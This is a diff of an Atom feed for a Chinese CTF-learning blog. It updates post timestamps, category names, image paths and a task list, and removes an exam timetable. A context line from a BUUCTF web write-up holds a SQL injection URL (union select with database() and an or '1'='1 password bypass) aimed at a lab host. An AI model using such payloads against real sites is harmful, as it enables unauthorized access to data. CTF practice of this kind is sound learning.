 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1246,7 +2128,7 @@ srv
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;://&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;a26fac72&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;af79&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;450&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;b512&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;f6c817dd9e4f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;node3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;buuoj&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;cn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;check&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select 1,2,database() %23&amp;amp;password=1&amp;#39;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUWeb/2021.6/BUUWeb%E9%80%9A%E5%85%B31/image-20210616133059398.png&#34; alt=&#34;image-20210616133059398&#34;&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B31/image-20210616133059398.png&#34; alt=&#34;image-20210616133059398&#34;&gt;&lt;/p&gt;
 &lt;p&gt;查询表名、字段名：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1513,79 +2395,16 @@ index.php&lt;/p&gt;
             <title type="text">2021.6-Task</title>
             <link rel="alternate" type="text/html" href="https://cn1nja.github.io/posts/2021.6-task/" />
             <id>https://cn1nja.github.io/posts/2021.6-task/</id>
-            <updated>2021-06-13T16:15:18&#43;08:00</updated>
+            <updated>2021-07-02T14:15:09&#43;08:00</updated>
             <published>2021-06-13T12:15:12&#43;08:00</published>
             <author>
                     <name>CN1nja</name>
                     <uri>https://cn1nja.github.io/</uri>
                     <email>mikecninja@gmail.com</email>
                     </author>
-            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">期末考试： 日期 周 课程 时间 地点 6月18号 周五 数据库原理 15:00-17:00 播馨楼110 汇编语言 网络工程 Python……</summary>
+            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">Task: Linux 学习 BUUCTF -web题20道 用 PHP+MYSQL+CSS+HTML 设计一个简单的网页</summary>
             
-                <content type="html">&lt;h4 id=&#34;期末考试&#34;&gt;期末考试：&lt;/h4&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th style=&#34;text-align:center&#34;&gt;日期&lt;/th&gt;
-&lt;th style=&#34;text-align:center&#34;&gt;周&lt;/th&gt;
-&lt;th style=&#34;text-align:center&#34;&gt;课程&lt;/th&gt;
-&lt;th style=&#34;text-align:center&#34;&gt;时间&lt;/th&gt;
-&lt;th style=&#34;text-align:center&#34;&gt;地点&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;6月18号&lt;/td&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;周五&lt;/td&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;数据库原理&lt;/td&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;15:00-17:00&lt;/td&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;播馨楼110&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;&lt;/td&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;&lt;/td&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;汇编语言&lt;/td&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;&lt;/td&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;&lt;/td&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;&lt;/td&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;网络工程&lt;/td&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;&lt;/td&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;&lt;/td&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;&lt;/td&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;Python&lt;/td&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;&lt;/td&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;&lt;/td&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;&lt;/td&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;英语&lt;/td&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;&lt;/td&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;&lt;/td&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;&lt;/td&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;毛概&lt;/td&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;&lt;/td&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;&lt;/td&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;&lt;/td&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;操作系统&lt;/td&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;&lt;/td&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;
-&lt;/table&gt;
-&lt;h3 id=&#34;task&#34;&gt;Task:&lt;/h3&gt;
+                <content type="html">&lt;h3 id=&#34;task&#34;&gt;Task:&lt;/h3&gt;
 &lt;p&gt;&lt;a href=&#34;https://www.bilibili.com/video/BV1mW411i7Qf?from=search&amp;amp;seid=14789442077981263608&#34;&gt;Linux 学习&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;BUUCTF -web题20道&lt;/p&gt;
 &lt;p&gt;用 PHP+MYSQL+CSS+HTML 设计一个简单的网页&lt;/p&gt;
@@ -1623,7 +2442,7 @@ index.php&lt;/p&gt;
             <title type="text">RSA常见攻击</title>
             <link rel="alternate" type="text/html" href="https://cn1nja.github.io/posts/rsa%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB/" />
             <id>https://cn1nja.github.io/posts/rsa%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB/</id>
-            <updated>2021-06-13T15:47:08&#43;08:00</updated>
+            <updated>2021-06-30T10:52:30&#43;08:00</updated>
             <published>2021-03-07T20:47:21&#43;08:00</published>
             <author>
                     <name>CN1nja</name>
@@ -2639,7 +3458,7 @@ flag = &amp;quot;flag{&amp;quot; + hashlib.md5(hex(d)).hexdigest() + &amp;quot;}
                             
                             
                             
-                                <category scheme="https://cn1nja.github.io/categories/crypto-study/" term="Crypto Study" label="Crypto Study" />
+                                <category scheme="https://cn1nja.github.io/categories/a_crypto-study/" term="A_Crypto Study" label="A_Crypto Study" />
                             
                         
                     
@@ -2661,7 +3480,7 @@ flag = &amp;quot;flag{&amp;quot; + hashlib.md5(hex(d)).hexdigest() + &amp;quot;}
             <title type="text">近世代数</title>
             <link rel="alternate" type="text/html" href="https://cn1nja.github.io/posts/%E8%BF%91%E4%B8%96%E4%BB%A3%E6%95%B0/" />
             <id>https://cn1nja.github.io/posts/%E8%BF%91%E4%B8%96%E4%BB%A3%E6%95%B0/</id>
-            <updated>2021-06-13T15:52:40&#43;08:00</updated>
+            <updated>2021-06-30T10:52:44&#43;08:00</updated>
             <published>2021-03-07T15:09:30&#43;08:00</published>
             <author>
                     <name>CN1nja</name>
@@ -2949,7 +3768,7 @@ $$4a^3+27b^2 \neq 0 mod  p$$
                             
                             
                             
-                                <category scheme="https://cn1nja.github.io/categories/crypto-study/" term="Crypto Study" label="Crypto Study" />
+                                <category scheme="https://cn1nja.github.io/categories/a_crypto-study/" term="A_Crypto Study" label="A_Crypto Study" />
                             
                         
                     
@@ -2971,7 +3790,7 @@ $$4a^3+27b^2 \neq 0 mod  p$$
             <title type="text">《数论》</title>
             <link rel="alternate" type="text/html" href="https://cn1nja.github.io/posts/%E6%95%B0%E8%AE%BA/" />
             <id>https://cn1nja.github.io/posts/%E6%95%B0%E8%AE%BA/</id>
-            <updated>2021-06-13T16:00:18&#43;08:00</updated>
+            <updated>2021-06-30T10:52:53&#43;08:00</updated>
             <published>2021-02-25T14:45:02&#43;08:00</published>
             <author>
                     <name>CN1nja</name>
@@ -3201,7 +4020,7 @@ $$n = P_1^{e_1} P_2^{e_2}…P_k^{e_k}$$
                             
                             
                             
-                                <category scheme="https://cn1nja.github.io/categories/crypto-study/" term="Crypto Study" label="Crypto Study" />
+                                <category scheme="https://cn1nja.github.io/categories/a_crypto-study/" term="A_Crypto Study" label="A_Crypto Study" />
                             
                         
                     
